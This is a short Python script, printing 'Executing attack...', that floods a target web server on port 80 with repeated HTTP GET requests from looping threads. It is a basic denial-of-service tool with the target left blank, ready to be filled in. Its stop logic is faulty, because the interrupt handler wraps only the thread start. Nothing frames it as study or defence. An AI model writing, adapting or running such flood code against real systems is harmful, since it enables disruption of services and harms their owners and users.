import socket
import threading
from threading import Event

target = ''
port = 80

def attack(stop_event: Event):
    while stop_event.is_set() is not True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target}\r\n\r\n"
        )
        s.connect((target, port))
        s.sendto(request.encode('ascii'), (target, port))
        # print("request sent")
        s.close()

def main(stop_event: Event):
    print("Executing attack...")
    for i in range(2):
        if stop_event.is_set() is not True:
            thread = threading.Thread(target=attack, args=(stop_event,))
            thread.start()
        else:
            break

if __name__ == "__main__":
    stop_event = threading.Event() 
    try:
        main_thread = threading.Thread(target=main, args=(stop_event,))
        main_thread.start()
    except KeyboardInterrupt:
        stop_event.set()
        print("Stopping the attack...")
        exit()